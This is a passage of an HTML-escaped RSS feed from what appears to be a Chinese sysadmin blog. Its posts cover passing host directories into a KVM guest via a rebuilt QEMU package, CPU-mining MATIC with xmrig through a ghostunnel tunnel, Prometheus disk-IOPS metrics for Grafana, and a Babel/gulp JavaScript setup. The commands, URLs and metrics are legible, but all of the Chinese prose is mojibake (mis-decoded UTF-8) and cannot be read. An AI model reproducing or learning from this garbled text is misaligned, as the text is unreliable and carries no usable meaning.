&lt;p&gt;å•ç‹¬ MySQL æ˜¯æ— æ³•é™åˆ¶å…¶ CPU æ ¸ä½¿ç”¨çš„ï¼Œè¿™æ ·çš„è¯ï¼Œæœ€å¥½å°±æ˜¯åšä¸ªè™šæœºæ¥æ§åˆ¶ MySQL æ€» CPU æ ¸æ•°çš„ä½¿ç”¨ï¼Œç„¶åç¡¬ç›˜æ‰©å®¹çš„è¯ï¼Œæ¯”å¦‚è¦æ‹‰ä¼¸è™šæœºçš„é™„åŠ ç¬¬äºŒå—ç¡¬ç›˜ï¼Œå¦‚æœæ˜¯ QEMU æ ¼å¼ï¼Œä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œæ‰€ä»¥å¹²è„†æŠŠå®¿ä¸»æœºçš„ç›®å½•ç›´æ¥é€ä¼ è¿›è™šæœºï¼Œä¹‹åå¦‚æœè¦æ‰©å®¹åŠ ç¡¬ç›˜ï¼Œç›´æ¥æŠŠæ–°çš„å¤§ç¡¬ç›˜ mount å‡ºæ¥å†é€è¿›å»å³å¯ï¼Œæ–°æ—§ç¡¬ç›˜æ‹·è´æ•°æ®ä¹Ÿæ¯”æ‹‰ä¼¸è™šæœºç¡¬ç›˜å¿«ã€‚&lt;/p&gt;
&lt;p&gt;CentOS7 ä¸‹çš„åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸¤ä¸ªå¤§å‰æï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€å®¿ä¸»æœºçš„ KVM qemu ç³»ç»Ÿéœ€è¦ä½¿ç”¨æ–°çš„ rpm åŒ…ï¼Œéœ€è¦ç¼–è¯‘&lt;/p&gt;
&lt;p&gt;äºŒã€è™šæœºçš„å†…æ ¸éœ€è¦å‡çº§ï¼Œmount å‘½ä»¤éœ€è¦æ”¯æŒ -t p9 çš„æ–°æ ¼å¼&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åšå¥½å‡†å¤‡ï¼Œå°±å¯ä»¥å¼€å§‹äº†&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ç¼–è¯‘å®¿ä¸»æœºçš„qemuæ–°åŒ…&#34;&gt;ä¸€ã€ç¼–è¯‘å®¿ä¸»æœºçš„qemuæ–°åŒ…&lt;/h2&gt;
&lt;p&gt;ç°åœ¨å·²ç»æ˜¯2022å¹´äº†ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ–¹å¼ä¹Ÿå‘ç”Ÿå˜åŒ–äº†ï¼Œæœ€ä½³ç¼–è¯‘æ–¹å¼æ˜¯å¹²è„†å¯åŠ¨ä¸€ä¸ª Docker è™šæ‹Ÿæœºï¼Œæ¥ç¼–è¯‘å‡ºæ¥ rpm åŒ…ï¼Œä¹Ÿä¸æ±¡æŸ“ç¯å¢ƒã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå…‹éš†ä¸‹æ¥é¡¹ç›®ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/AlekseyChudov/qemu-kvm-virtfs.git

cd qemu-kvm-virtfs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çœ‹ä¸€ä¸‹æœ€åçš„ build è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼š&lt;/p&gt;
&lt;p&gt;ç°åœ¨çš„ CentOS æœ€æ–°ç‰ˆæ˜¯ 7.9.2009 ï¼Œè¿™ä¸ªç‰ˆæœ¬æ ‘é‡Œæ˜¯æ²¡æœ‰ qemu çš„ Source Code çš„ï¼Œéœ€è¦ä¿®æ”¹ baseurlï¼Œé™ä½åˆ° 7.8.2003 æ‰æœ‰ Source çš„ repo&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;baseurl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;https://mirrors.tripadvisor.com/centos-vault/centos/\$releasever/virt/Source/kvm-common/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;æ”¹æˆï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;baseurl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ”¹å¥½å build è„šæœ¬å¦‚ä¸‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•ç”¨CPUæŒ–Polygonç½‘ç»œçš„MATICå¸</title>
      <link>https://rendoumi.com/posts/20220222-eth_matic/</link>
      <pubDate>Tue, 22 Feb 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220222-eth_matic/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸ªä¸¥è‚ƒè¯é¢˜ï¼Œæ­£ç»æŒ–ä»¥å¤ªå¸çš„è¯ï¼Œå¾ˆå¤šçš„çŸ¿å‚éƒ½æ˜¯å¦‚æœç›´æ¥æŒ–åˆ°ä»¥å¤ªå¸åœ°å€ï¼Œé‚£ä¹ˆå¿…é¡»æŒ–åˆ°å®Œæ•´ä¸€ä¸ªæ‰å…è®¸æç°ï¼Œæ‰‹ç»­è´¹è¿˜ç‰¹é«˜ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å¦‚æœæŒ–åˆ°ä»¥å¤ªé“¾Polygonçš„åœ°å€çš„è¯ï¼Œå°±å¯ä»¥ 0.005 ETHæå¸äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220222154256454&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220222-eth_matic/image-20220222154256454.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯åƒä¸‡è®°ä½ï¼ŒPolygonæå‡ºçš„æ‰€è°“ 0.005 ETHï¼Œçœ‹ä¸‹å›¾ï¼Œåªæ˜¯ä¸ªERC-20çš„Tokenï¼Œå®é™…æ˜¯wETH Tokenï¼Œå¿…é¡»ç»è¿‡è½¬æ¢æ‰èƒ½æåˆ° ETH å»ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220222154450998&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220222-eth_matic/image-20220222154450998.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä» ERC-20 è½¬æ¢åˆ°å…¶å®ƒä»£å¸å‘¢ï¼Œéœ€è¦ MATIC ä»£å¸æ¥ä»˜è´¦ï¼Œè¿™ç©æ„ä¹Ÿå¿…é¡»å¾—æœ‰å•Šï¼åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸ŠæŒ–MATICæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS&lt;/p&gt;
&lt;p&gt;é¦–å…ˆéœ€è¦æœ‰ä¸ªå®Œå…¨è‡ªä¸»çš„çš„ ETH é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶&#34;&gt;ä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶&lt;/h2&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;Float Left&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220222-eth_matic/image-20211021101957637.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;äºŒåšå¥½åŠ å¯†é€šé“&#34;&gt;äºŒã€åšå¥½åŠ å¯†é€šé“&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“&lt;/p&gt;
&lt;p&gt;ç”¨ ghostunnel,    localhost:9012 &amp;mdash;&amp;gt; vps:9012 &amp;mdash;&amp;gt; rx.unmineable.com:3333&lt;/p&gt;
&lt;h2 id=&#34;ä¸‰ç”¨screenåå°å¼€æŒ–&#34;&gt;ä¸‰ã€ç”¨screenåå°å¼€æŒ–&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;screen
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#./xmrig -o localhost:9999 -a rx -k -u DOGE:MATICåœ°å€.çŸ¿å·¥å&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./xmrig -o localhost:9012 -u MATIC:0x64358C7ddC96001697aBbA7ed431BADB6ABAaec5.cpu01 -p x --cpu-no-yield
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ctrl+a+d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20211021102338089&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220222-eth_matic/image-20211021102338089.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å››æŸ¥çœ‹æŒ–äº†å¤šå°‘&#34;&gt;å››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘&lt;/h2&gt;
&lt;p&gt;æŸ¥çœ‹åœ°å€ï¼š&lt;a href=&#34;https://unmineable.com/coins/MATIC/address/&#34;&gt;https://unmineable.com/coins/MATIC/address/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220222154854349&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220222-eth_matic/image-20220222154854349.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;äº”å…‘æ¢&#34;&gt;äº”ã€å…‘æ¢&lt;/h2&gt;
&lt;p&gt;æŒ–åˆ°äº†è¶³å¤Ÿçš„ MATICï¼Œå°±å¯ä»¥æ„‰å¿«çš„å…‘æ¢äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220222155452048&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220222-eth_matic/image-20220222155452048.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Grafanaç”»å‡ºprometheusçš„å›¾</title>
      <link>https://rendoumi.com/posts/20220118-grafana_prometheus/</link>
      <pubDate>Tue, 18 Jan 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220118-grafana_prometheus/</guid>
      <description>&lt;p&gt;å…¬å¸è¦åšé˜¿é‡Œçš„å°ç¨‹åºæ¥å…¥ï¼Œéœ€è¦é€šè¿‡æµ‹è¯•ï¼Œæµ‹è¯•å‘¢éœ€è¦æä¾›ç¡¬ç›˜çš„ç›‘æ§æŠ¥å‘Šï¼Œæ¯”å¦‚ iops ã€‚&lt;/p&gt;
&lt;p&gt;åŒäº‹ä»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œiops ç›‘æ§åŸæ–‡å¦‚ä¸‹ï¼šç›‘æ§ç£ç›˜çš„ iops ï¼Œåˆ©ç”¨ linux çš„ /proc/diskstats çš„ç¬¬å››ä¸ªå­—æ®µå’Œç¬¬å…«å­—æ®µå¯ç›‘æ§è¯»å’Œå†™çš„ iopsï¼Œç¬¬å››ä¸ªè®°å½•æ˜¯è®°å½•æ‰€æœ‰è¯»çš„æ¬¡æ•°ï¼Œç¬¬å…«ä¸ªå­—æ®µæ˜¯è®°å½•æ‰€æœ‰å†™çš„æ¬¡æ•°ã€‚é€šè¿‡ zabbix ä¸Šçš„å·®é€Ÿç‡å³å¯ç›‘æ§ç£ç›˜çš„ iopsã€‚&lt;/p&gt;
&lt;p&gt;æ–‡ç« é“¾æ¥ï¼š&lt;a href=&#34;https://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u&#34;&gt;https://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ä¸Šé¢çš„æ–‡ç« ï¼Œçœ‹äº†å®ƒæä¾›äº†ä¸¤å¼ ç›‘æ§å›¾ï¼Œåˆ†æä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€å¼ å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220118093026319&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220118-grafana_prometheus/image-20220118093026319.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ‰ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯»æ¬¡æ•°ï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™æ¬¡æ•°ã€‚&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒå¼ å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220118093147796&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220118-grafana_prometheus/image-20220118093147796.png&#34;&gt;åŒæ ·ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯» Bytesï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™ Bytesã€‚&lt;/p&gt;
&lt;p&gt;çŸ¥é“äº†æŒ‡æ ‡å…·ä½“çš„å«ä¹‰ï¼Œè¿™æ ·å°±å¥½åŠäº†ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨çš„æ˜¯ prometheus å’Œ node_exporter&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»çœ‹çœ‹ node_exporter æš´éœ²çš„æŒ‡æ ‡ï¼Œæœä¸€æœ node_diskï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹4ä¸ªæŒ‡æ ‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# HELP node_disk_reads_completed_total The total number of reads completed successfully.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# TYPE node_disk_reads_completed_total counter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;node_disk_reads_completed_total{device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sda&amp;#34;} 4.9530358e+07&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# HELP node_disk_writes_completed_total The total number of writes completed successfully.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# TYPE node_disk_writes_completed_total counter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;node_disk_writes_completed_total{device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sda&amp;#34;} 1.4449267304e+10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# HELP node_disk_read_bytes_total The total number of bytes read successfully.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# TYPE node_disk_read_bytes_total counter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;node_disk_read_bytes_total{device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sda&amp;#34;} 6.4101677568e+11&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# HELP node_disk_written_bytes_total The total number of bytes written successfully.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# TYPE node_disk_written_bytes_total counter&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;node_disk_written_bytes_total{device&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sda&amp;#34;} 1.15483858333184e+14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹å‡ºæ˜¯ä¸Šé¢ 4 ä¸ªæŒ‡æ ‡ï¼Œè¿™å››ä¸ªæŒ‡æ ‡éƒ½æ˜¯ counter è®¡æ•°å™¨ç±»å‹çš„ï¼Œéƒ½æ˜¯åªå¢ä¸å‡çš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Javascriptçš„é¡¹ç›®ä¸babelå’Œeslint</title>
      <link>https://rendoumi.com/posts/20220104-javascript_babel_eslint/</link>
      <pubDate>Tue, 04 Jan 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220104-javascript_babel_eslint/</guid>
      <description>&lt;p&gt;æœ€è¿‘å¼€å§‹å¼„hubotï¼Œé¡ºå¸¦ä¹Ÿå¼€å§‹å­¦ä¹  javascript ï¼Œé¦–å…ˆä»å•ç‹¬ä¸€ä¸ª nodejs é¡¹ç›®å¼€å§‹ï¼š&lt;/p&gt;
&lt;p&gt;nvm å’Œ node çš„å®‰è£…ä½¿ç”¨åœ¨å‰é¢å·²ç»è¯´è¿‡äº†ï¼š  &lt;a href=&#34;https://rendoumi.com/posts/20211217-nodejs_nvm/&#34;&gt;Nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ–°å»ºä¸€ä¸ªé¡¹ç›®ç›®å½•ï¼Œbuild01&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨å…¶ä¸‹å»ºç«‹å¦‚ä¸‹ç›®å½•ç»“æ„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir build01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; build01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir es6 dist
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir public
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; public
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir es6 dist 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20220104160358593&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220104-javascript_babel_eslint/image-20220104160358593.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼Œes6 ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯çš„æºä»£ç ï¼Œdist ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;public/es6 æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯çš„æºä»£ç ï¼Œpublic/dist æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€å®‰è£…gulpå’Œbabel&#34;&gt;ä¸€ã€å®‰è£…gulpå’Œbabel&lt;/h2&gt;
&lt;p&gt;babel æ˜¯ç”¨æ¥åš js æ ¼å¼è½¬æ¢çš„ï¼Œæ³¨æ„ï¼ŒåŸæœ‰çš„ babel-preset-es2015 å·²ç»ä¸é€‚ç”¨äº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install --save-dev gulp gulp-babel babel-preset-env@next
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”Ÿæˆä¸€ä¸ª&lt;code&gt;.babelrc&lt;/code&gt; æ–‡ä»¶ï¼Œå†…å®¹å°±ä¸€è¡Œ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;{ &amp;#34;presets&amp;#34;: [&amp;#34;env&amp;#34;] }&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨ es6 ç›®å½•ä¸‹ï¼Œå»ºç«‹ä¸€ä¸ªæµ‹è¯•çš„ &lt;code&gt;test.js&lt;/code&gt; æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;&amp;#39;use strict&amp;#39;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;const sentences&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  { subject: &amp;#39;JavaScript&amp;#39;, verb: &amp;#39;is&amp;#39;,  object: &amp;#39;great&amp;#39; },
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;  { subject: &amp;#39;Elephants&amp;#39;,  verb: &amp;#39;are&amp;#39;, object: &amp;#39;large&amp;#39; },&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;function say({ subject, verb, object }) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;console.log(`${subject} ${verb} ${object}`);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;for ( let s of sentences) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;na&#34;&gt;say(s);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»”ç»†çœ‹ï¼Œä¸Šé¢è¿™ä¸ªæ–‡ä»¶ç”¨åˆ°äº† es6 çš„è¯­æ³•ï¼Œå¯¹è±¡çš„è§£æ„ï¼Œofè¯­æ³•ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>huboté›†æˆä¼ä¸šå¾®ä¿¡&#43;jenkins&#43;ansible</title>
      <link>https://rendoumi.com/posts/20211222-hubot_wechat/</link>
      <pubDate>Wed, 22 Dec 2021 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20211222-hubot_wechat/</guid>
      <description>&lt;p&gt;Hubotæ˜¯ä¸€ä¸ªé€šç”¨çš„èŠå¤©æœºå™¨äººï¼Œèƒ½å’Œå¾ˆå¤šèŠå¤©è½¯ä»¶é›†æˆï¼Œæ¯”å¦‚slackã€rockchatã€telegramã€ä¼ä¸šå¾®ä¿¡ã€IRCç­‰ã€‚&lt;/p&gt;
